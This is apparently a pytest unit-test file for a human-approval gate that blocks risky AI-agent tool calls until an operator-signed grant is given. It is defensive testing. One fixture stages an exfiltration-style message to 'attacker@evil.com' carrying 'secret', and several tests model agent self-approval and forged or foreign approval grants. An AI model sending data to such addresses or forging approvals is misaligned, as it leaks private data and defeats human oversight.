"""SPEC-035 REQ-014/015/016 — human-approval gate unit tests.

The gate pauses a trifecta-completing call for explicit human approval, mints a
one-shot OPERATOR-signed token (never the agent DID — ASI09), fails closed on
timeout/denial, and never auto-approves at federal.
"""

from __future__ import annotations

import asyncio

import pytest
from arctrust.policy import (
    ApprovalGrant,
    OperatorApprovalAuthority,
    PolicyContext,
    ToolCall,
    sign_approval_for_hash,
    verify_approval,
)
from arctrust.signer import InProcessSigner
from nacl.signing import SigningKey

from arcagent.tools.human_gate import (
    ApprovalRequest,
    HumanGate,
    HumanGateConfig,
    redact_arguments,
    summarize_arguments,
)

_TRIFECTA = frozenset({"private_data", "external_comms", "untrusted_input"})


def _operator_signer() -> InProcessSigner:
    return InProcessSigner(bytes(SigningKey.generate()))


def _call(agent_did: str = "did:arc:example:org:agent:abc") -> ToolCall:
    return ToolCall(
        tool_name="egress",
        arguments={"url": "https://x"},
        agent_did=agent_did,
        session_id="",
        classification="unclassified",
        capability_tags=frozenset({"external_comms"}),
    )


@pytest.mark.asyncio
class TestHumanGate:
    async def test_fail_closed_when_no_channel(self) -> None:
        gate = HumanGate(
            operator_signer=_operator_signer(),
            agent_did="did:arc:example:org:agent:abc",
            tier="federal",
        )
        assert await gate.request(_call(), legs=_TRIFECTA) is None

    async def test_operator_grant_is_not_self_approval(self) -> None:
        agent_did = "did:arc:example:org:agent:abc"
        gate = HumanGate(
            operator_signer=_operator_signer(),
            agent_did=agent_did,
            tier="personal",
            config=HumanGateConfig(auto_approve=[_TRIFECTA]),
        )
        call = _call(agent_did)
        grant = await gate.request(call, legs=_TRIFECTA)
        assert grant is not None
        # Approver is the operator, never the agent (ASI09) — and it verifies.
        assert grant.approver_did != agent_did
        assert verify_approval(call, grant) is True

    async def test_agent_cannot_mint_valid_self_approval(self) -> None:
        # A grant whose approver == the agent DID must fail verification, proving
        # the agent's own key can never satisfy the gate.
        agent_did = "did:arc:example:org:agent:abc"
        gate = HumanGate(
            operator_signer=_operator_signer(),
            agent_did=agent_did,
            tier="personal",
            config=HumanGateConfig(auto_approve=[_TRIFECTA]),
        )
        call = _call(agent_did)
        grant = await gate.request(call, legs=_TRIFECTA)
        assert grant is not None
        forged = grant.model_copy(update={"approver_did": agent_did})
        assert verify_approval(call, forged) is False

    async def test_federal_never_auto_approves(self) -> None:
        gate = HumanGate(
            operator_signer=_operator_signer(),
            agent_did="did:arc:example:org:agent:abc",
            tier="federal",
            config=HumanGateConfig(auto_approve=[_TRIFECTA]),
        )
        assert await gate.request(_call(), legs=_TRIFECTA) is None

    async def test_channel_approve_and_deny(self) -> None:
        # The channel returns a grant signed by the DEPLOYMENT operator key (the
        # same key the gate pins to); deny returns None. The gate verifies + pins.
        signer = _operator_signer()
        operator = OperatorApprovalAuthority(signer)

        async def approve(req: ApprovalRequest) -> ApprovalGrant | None:
            return sign_approval_for_hash(req.call_hash, operator)

        async def deny(_req: ApprovalRequest) -> ApprovalGrant | None:
            return None

        agent_did = "did:arc:example:org:agent:abc"
        approving = HumanGate(
            operator_signer=signer, agent_did=agent_did, tier="enterprise", channel=approve
        )
        denying = HumanGate(
            operator_signer=signer, agent_did=agent_did, tier="enterprise", channel=deny
        )
        assert await approving.request(_call(), legs=_TRIFECTA) is not None
        assert await denying.request(_call(), legs=_TRIFECTA) is None

    async def test_channel_grant_for_wrong_call_is_rejected(self) -> None:
        # A grant the channel signs for a DIFFERENT call_hash must fail the gate's
        # verify — approval binds to exactly the call that tripped it (ASI09).
        signer = _operator_signer()
        operator = OperatorApprovalAuthority(signer)

        async def wrong_hash(_req: ApprovalRequest) -> ApprovalGrant | None:
            return sign_approval_for_hash("deadbeefdeadbeef", operator)

        gate = HumanGate(
            operator_signer=signer,
            agent_did="did:arc:example:org:agent:abc",
            tier="enterprise",
            channel=wrong_hash,
        )
        assert await gate.request(_call(), legs=_TRIFECTA) is None

    async def test_grant_from_foreign_operator_key_is_rejected(self) -> None:
        # THE spoof-proofness property: a grant correctly signed for the right
        # call, but by a DIFFERENT (foreign) key than the deployment operator's,
        # is rejected — verify_approval accepts any non-agent key, so only the
        # gate's operator-DID pin stops a foreign actor from self-approving.
        foreign = OperatorApprovalAuthority(_operator_signer())

        async def foreign_approve(req: ApprovalRequest) -> ApprovalGrant | None:
            return sign_approval_for_hash(req.call_hash, foreign)

        gate = HumanGate(
            operator_signer=_operator_signer(),  # the DEPLOYMENT key — different
            agent_did="did:arc:example:org:agent:abc",
            tier="enterprise",
            channel=foreign_approve,
        )
        assert await gate.request(_call(), legs=_TRIFECTA) is None

    async def test_channel_timeout_fails_closed(self) -> None:
        async def hang(_req: ApprovalRequest) -> ApprovalGrant | None:
            await asyncio.sleep(10)
            return None

        gate = HumanGate(
            operator_signer=_operator_signer(),
            agent_did="did:arc:example:org:agent:abc",
            tier="enterprise",
            config=HumanGateConfig(timeout_seconds=0.05),
            channel=hang,
        )
        assert await gate.request(_call(), legs=_TRIFECTA) is None

    async def test_grant_binds_to_the_one_call(self) -> None:
        # REQ-015: a grant for one call does not validate a different call.
        signer = _operator_signer()
        agent_did = "did:arc:example:org:agent:abc"
        gate = HumanGate(
            operator_signer=signer,
            agent_did=agent_did,
            tier="personal",
            config=HumanGateConfig(auto_approve=[_TRIFECTA]),
        )
        call_a = _call(agent_did)
        call_b = call_a.model_copy(update={"arguments": {"url": "https://different"}})
        grant = await gate.request(call_a, legs=_TRIFECTA)
        assert grant is not None
        assert verify_approval(call_a, grant) is True
        assert verify_approval(call_b, grant) is False


@pytest.mark.asyncio
class TestAutoApproveExactMatch:
    """A named auto-approve composition must match the tripping set EXACTLY.

    A subset match (the pre-fix behavior) let a 2-leg auto_approve entry
    green-light the full 3-leg trifecta, because the tripping union is always a
    superset of any 2-leg subset.
    """

    async def test_two_leg_entry_does_not_auto_approve_full_trifecta(self) -> None:
        two_legs = frozenset({"private_data", "external_comms"})
        gate = HumanGate(
            operator_signer=_operator_signer(),
            agent_did="did:arc:example:org:agent:abc",
            tier="personal",
            config=HumanGateConfig(auto_approve=[two_legs]),
        )
        # No channel + no exact auto-approve match → fail closed.
        assert await gate.request(_call(), legs=_TRIFECTA) is None

    async def test_exact_entry_auto_approves(self) -> None:
        gate = HumanGate(
            operator_signer=_operator_signer(),
            agent_did="did:arc:example:org:agent:abc",
            tier="personal",
            config=HumanGateConfig(auto_approve=[_TRIFECTA]),
        )
        assert await gate.request(_call(), legs=_TRIFECTA) is not None


def test_policy_context_carries_session_capabilities() -> None:
    # The injected accumulator field exists and is optional (backward-compatible).
    ctx = PolicyContext(tier="personal", policy_version="v0", bundle_age_seconds=0.0)
    assert ctx.session_capabilities is None


class TestArgumentRedaction:
    """SPEC-035 approval enrichment — arguments are redacted + length-bounded."""

    def test_secrets_and_pii_are_redacted(self) -> None:
        preview = redact_arguments(
            {"to": "victim@example.com", "body": "my ssn is 123-45-6789"}
        )
        assert "victim@example.com" not in preview["to"]
        assert "123-45-6789" not in preview["body"]

    def test_values_are_length_bounded(self) -> None:
        preview = redact_arguments({"body": "A" * 5000})
        assert len(preview["body"]) <= 130  # cap (120) + ellipsis
        assert preview["body"].endswith("...")

    def test_summary_is_bounded_one_line(self) -> None:
        summary = summarize_arguments({"a": "x" * 500, "b": "y" * 500})
        assert len(summary) <= 200
        assert "\n" not in summary


@pytest.mark.asyncio
class TestApprovalRequestEnrichment:
    """The gate threads arguments (redacted), provenance, and session_id through."""

    async def test_request_carries_enriched_fields_into_channel(self) -> None:
        captured: dict[str, ApprovalRequest] = {}

        async def capture(req: ApprovalRequest) -> ApprovalGrant | None:
            captured["req"] = req
            return None

        agent_did = "did:arc:example:org:agent:abc"
        call = ToolCall(
            tool_name="messaging_send",
            arguments={"to": "attacker@evil.com", "body": "secret"},
            agent_did=agent_did,
            session_id="sess-42",
            classification="unclassified",
            capability_tags=frozenset({"external_comms"}),
        )
        gate = HumanGate(
            operator_signer=_operator_signer(),
            agent_did=agent_did,
            tier="enterprise",
            channel=capture,
        )
        provenance = [{"legs": ["private_data"], "tool": "file_read", "args": "path=/x", "at": "t"}]
        await gate.request(call, legs=_TRIFECTA, provenance=provenance)

        req = captured["req"]
        assert req.session_id == "sess-42"
        assert req.leg_provenance == provenance
        assert "attacker@evil.com" not in req.arguments["to"]  # redacted
        assert set(req.arguments) == {"to", "body"}

    async def test_emit_payload_includes_enriched_fields(self) -> None:
        events: list[tuple[str, dict[str, object]]] = []

        gate = HumanGate(
            operator_signer=_operator_signer(),
            agent_did="did:arc:example:org:agent:abc",
            tier="federal",
            audit_sink=lambda event, payload: events.append((event, payload)),
        )
        call = ToolCall(
            tool_name="egress",
            arguments={"url": "https://x"},
            agent_did="did:arc:example:org:agent:abc",
            session_id="sess-7",
            classification="unclassified",
            capability_tags=frozenset({"external_comms"}),
        )
        # No channel + federal → fail closed, but an audit event still emits.
        await gate.request(call, legs=_TRIFECTA, provenance=[{"tool": "file_read"}])

        assert events, "an audit event must be emitted"
        _, payload = events[0]
        assert payload["session_id"] == "sess-7"
        assert payload["arguments"] == {"url": "https://x"}
        assert payload["leg_provenance"] == [{"tool": "file_read"}]
